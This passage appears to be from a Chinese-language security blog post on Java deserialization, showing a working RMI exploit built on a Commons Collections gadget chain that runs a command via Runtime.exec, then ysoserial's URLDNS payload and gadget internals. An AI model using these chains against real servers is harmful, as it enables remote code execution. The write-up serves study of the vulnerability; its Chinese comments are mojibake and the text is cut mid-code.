class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIexploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// è¿œç¨‹ RMI Server çš„åœ°å€</span></span><br><span class="line">        String ip = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1099</span>;</span><br><span class="line">        <span class="comment">// è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ„é€  transformers</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        <span class="comment">// æ„é€  chainedtransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TiedMapEntry ç±»ä¸­è°ƒç”¨ Map ç±»çš„ get æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// LazyMap çš„ get æ–¹æ³•è°ƒç”¨ transform</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BadAttributeValueExpException é‡å†™ readObject æ–¹æ³•ï¼Œè°ƒç”¨è¾“å…¥æµçš„ toString æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// TiremapEntry çš„ getValue æ–¹æ³•è°ƒç”¨ LazyMap çš„ get æ–¹æ³•</span></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        <span class="comment">// è®¾ç½® TiedMapEntry</span></span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(badAttributeValueExpException, entry);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æŠŠ BadAttributeValueExpException å¯¹è±¡å°è£…åœ¨ Map ä¸­</span></span><br><span class="line">        String name = <span class="string">&quot;pwned&quot;</span> + System.nanoTime();</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        map.put(name, badAttributeValueExpException);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è·å¾— AnnotationInvocationHandler çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        Constructor cl = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cl.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æŠŠ Map å°è£…åˆ° AnnotationInvocationHandler ä¸­ï¼Œè½¬æ¢ä¸º Remote ç±»å‹</span></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªä»£ç†</span></span><br><span class="line">        InvocationHandler hl = (InvocationHandler)cl.newInstance(Override.class, map);</span><br><span class="line">        Object object = Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Remote.class&#125;, hl);</span><br><span class="line">        Remote remote = Remote.class.cast(object);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line">        registry.bind(name, remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><img src="https://i.loli.net/2021/09/16/18OfJbtvEo64U3F.jpg" ><h1 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h1><p>Java ååºåˆ—åŒ– RCE ä¸‰è¦ç´ ï¼šreadobject åˆ©ç”¨ç‚¹ã€åˆ©ç”¨é“¾ã€RCE è§¦å‘ç‚¹</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><blockquote><p>URL ç±»çš„å¯¹è±¡åœ¨æ¯”è¾ƒæ—¶ä¼šè¿›è¡Œ DNS æŸ¥è¯¢ï¼ŒHashMap ååºåˆ—åŒ–æ—¶ä¼šå¯¹ key è¿›è¡Œå“ˆå¸Œå’Œæ¯”è¾ƒ<br>å°† URL ç±»å¯¹è±¡ä½œä¸º HashMap çš„ keyï¼ŒåŒæ—¶å°†å…¶ url è®¾ç½®ä¸ºå¯ä»¥æŸ¥è¯¢ DNSLOG åœ°å€ï¼Œå°† HashMap å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œå½“æœåŠ¡å™¨ååºåˆ—è¯¥æ•°æ®æ—¶å°†è§¦å‘ DNS æŸ¥è¯¢ã€‚</p></blockquote><p>ä¸ä¾èµ–ä»»ä½•ç¬¬ä¸‰æ–¹åº“ï¼Œå¯ä»¥ç”¨äºç¡®è®¤ <code>readObject</code> ååºåˆ—åŒ–åˆ©ç”¨ç‚¹å­˜åœ¨</p><p>URL ç±»åœ¨æ¯”è¾ƒæ—¶ï¼ˆ<code>equals</code>ã€<code>hashCode</code>ï¼‰ä¼šè¿›è¡Œ DNS æŸ¥è¯¢ï¼Œå½“ä¸¤ä¸ªä¸»æœºåè§£æåˆ°åŒä¸€ä¸ª ip æ—¶è®¤ä¸ºå®ƒä»¬ç›¸ç­‰ã€‚</p><p>åˆ©ç”¨é“¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() <span class="comment"># k-v ç»“æ„</span></span><br><span class="line">  HashMap.putVal()   <span class="comment"># java.util.HashMap#readObject ååºåˆ—åŒ–ä¸­è°ƒç”¨ï¼Œå‚æ•°ä¸º hash(key)</span></span><br><span class="line">    HashMap.hash()   <span class="comment"># è®¡ç®— key çš„å“ˆå¸Œå€¼ï¼Œè°ƒç”¨ java.net.URL#hashCode</span></span><br><span class="line">      URL.hashCode() <span class="comment"># å½“ hashCode ä¸º -1 æ—¶ï¼Œè°ƒç”¨ java.net.URLStreamHandler#hashCodeï¼Œå†…éƒ¨å†è°ƒç”¨ getHostAddress </span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/TkyD5gURHJzx4lG.png" ><p>POC ç¤ºä¾‹</p><ul><li>å°† URL å¯¹è±¡ä½œä¸º HashMap çš„ keyï¼Œååºåˆ—åŒ–æ—¶è§¦å‘ DNS æŸ¥è¯¢</li><li>URL ç±»ä¼šç¼“å­˜ <code>hashCode</code> çš„æ‰§è¡Œç»“æœï¼Œå­˜å‚¨åœ¨ä¸€ä¸ªé transient çš„å®ä¾‹å˜é‡ä¸­ï¼Œåºåˆ—åŒ–æ—¶å†™å…¥<ul><li>å› æ­¤åœ¨æŠŠ URL æ·»åŠ åˆ° HashMap å‰è¦é‡ç½®ç¼“å­˜å€¼ï¼ˆåˆ©ç”¨åå°„ï¼‰</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 0x01.ç”Ÿæˆ payload</span></span><br><span class="line">        <span class="comment">// è®¾ç½®ä¸€ä¸ª hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è®¾ç½®å¯ä»¥æ¥æ”¶ DNS æŸ¥è¯¢çš„åœ°å€</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å°† URL çš„ hashCode å­—æ®µè®¾ç½®ä¸ºå…è®¸ä¿®æ”¹</span></span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. è®¾ç½® url çš„ hashCode å­—æ®µä¸º 0xdeadbeefï¼ˆéšæ„çš„å€¼ï¼‰</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);  <span class="comment">// é»˜è®¤ä¸º -1 ä¼šè§¦å‘ DNS æŸ¥è¯¢ï¼Œå› æ­¤ä¿®æ”¹å hashMap.put ä¸­å°±ä¸è§¦å‘</span></span><br><span class="line">        <span class="comment">// 2. å°† url æ”¾å…¥ hashMap ä¸­ï¼Œå³è¾¹å‚æ•°éšä¾¿å†™</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        <span class="comment">// ä¿®æ”¹ url çš„ hashCode å­—æ®µä¸º -1ï¼Œè§¦å‘ DNS æŸ¥è¯¢</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x02.å†™å…¥æ–‡ä»¶æ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x03.è¯»å–æ–‡ä»¶ï¼Œè¿›è¡Œååºåˆ—åŒ–è§¦å‘ payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS ä½¿ç”¨ URL ç±»å¯¹è±¡å’Œ url å€¼ä½œä¸º HashMap å¯¹è±¡çš„ key-value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS.SilentURLStreamHandler é¿å…åœ¨ç”Ÿæˆ payload æ—¶è§¦å‘ DNS æŸ¥è¯¢ï¼Œè¿”å›ä¸ºç©º</p><ul><li>è§„é¿ DNSLOG</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h2><blockquote><p>åˆ©ç”¨ ChainedTransformer æ„é€ æ¶æ„ä»£ç æ‰§è¡Œé“¾ï¼Œååºåˆ—åŒ–æ—¶è§¦å‘å…¶ transform æ–¹æ³•é€šè¿‡åå°„è°ƒç”¨æ„é€ å¥½çš„æ¶æ„ä»£ç <br>TransformedMap ä¿®æ”¹ key å°±ä¼šè§¦å‘è°ƒç”¨ç›¸åº”çš„ transformer.transform<br>åŠ¨æ€ä»£ç† AnnotationInvocationHandler åœ¨ååºåˆ—åŒ–æ—¶å¯¹å…¶å˜é‡è¿›è¡Œè®¾ç½®æ“ä½œ<br>ChainedTransformer å’Œ AnnotationInvocationHandler å¯ä½œä¸ºå…¶ä»– gadget çš„â€œååŠâ€éƒ¨åˆ†</p></blockquote><p>åå°„æœºåˆ¶ï¼šåœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ã€‚</p><p>æ¼æ´æˆå› ï¼šInvokerTransformer ç±»å®ç°çš„ Transformer æ¥å£ï¼Œå¯ä»¥é€šè¿‡ Java åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ã€‚</p><p>è¿œç¨‹ä»£ç æ‰§è¡Œï¼šClient æ„é€ æ¶æ„åºåˆ—åŒ–å¯¹è±¡ï¼ŒServer ååºåˆ—åŒ–è§¦å‘ <code>readObject</code> æ–¹æ³•ï¼Œè§¦å‘æ„é€ å¥½çš„ Transformer åºåˆ—ï¼Œå®ç°ä»£ç æ‰§è¡Œã€‚</p><img src="https://i.loli.net/2021/09/16/43poxMzsqw78rDm.png" ><p>Map ç±»æ˜¯å­˜å‚¨é”®å€¼å¯¹çš„æ•°æ®ç»“æ„ï¼ŒApache Commons Collectionsä¸­å®ç°äº†ç±» TransformedMapï¼Œç”¨æ¥å¯¹ Map è¿›è¡ŒæŸç§å˜æ¢ï¼Œåªè¦è°ƒç”¨ <code>decorate()</code> å‡½æ•°ï¼Œä¼ å…¥ key å’Œ value çš„å˜æ¢å‡½æ•° Transformerï¼Œå³å¯ä»ä»»æ„ Map å¯¹è±¡ç”Ÿæˆç›¸åº”çš„ TransformedMapã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(map);</span><br><span class="line"><span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line"><span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transformer æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶ä¸­å®šä¹‰çš„ <code>transform()</code> å‡½æ•°ç”¨æ¥å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ã€‚å½“ Map ä¸­çš„ä»»æ„é¡¹çš„ key æˆ–è€… value è¢«ä¿®æ”¹ï¼Œç›¸åº”çš„ Transformer å°±ä¼šè¢«è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Apache Commons Collections ä¸­å·²ç»å®ç°äº†ä¸€äº›å¸¸è§çš„ Transformerï¼Œå…¶ä¸­çš„ InvokerTransformer å¯ä»¥é€šè¿‡è°ƒç”¨ Java çš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼š</p><ul><li>å¯æ§å‚æ•° <code>iMethodName</code>ã€<code>iParamTypes</code>ã€<code>iArgs</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName; <span class="comment">// æ–¹æ³•åç§°</span></span><br><span class="line">        iParamTypes = paramTypes; <span class="comment">// å‚æ•°ç±»å‹</span></span><br><span class="line">        iArgs = args;  <span class="comment">// å‚æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConstantTransformer çš„ <code>transform()</code> æ–¹æ³•ï¼Œè¿”å› iConstant å±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ChainedTransformer æ¥å— Transformer æ•°ç»„ï¼Œ<code>transform</code> æ–¹æ³•å¾ªç¯è°ƒç”¨ Transformer çš„ transform æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨å‰ä¸€ä¸ª object ä½œä¸ºå‚æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨éœ€è¦è§¦å‘ ChainedTransformer å¯¹è±¡çš„ <code>transform()</code> å‡½æ•°ï¼Œè€Œ TransformedMap çš„ <code>checkSetValue</code> å‡½æ•°ä¸­å°±è°ƒç”¨äº† <code>transform</code> æ–¹æ³•ï¼Œé‚£ä¹ˆå°±è¦é€šè¿‡æ„é€ ä¸€ä¸ª Map å’Œä¸€ä¸ªèƒ½æ‰§è¡Œä»£ç çš„ ChainedTransformer ä»¥æ­¤ç”Ÿæˆ TransformedMapï¼Œç„¶åä¿®æ”¹ Map è§¦å‘ Transformer è°ƒç”¨ã€‚</p><p>TransformedMap ä¸­æœ‰ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨äº† <code>transform()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span 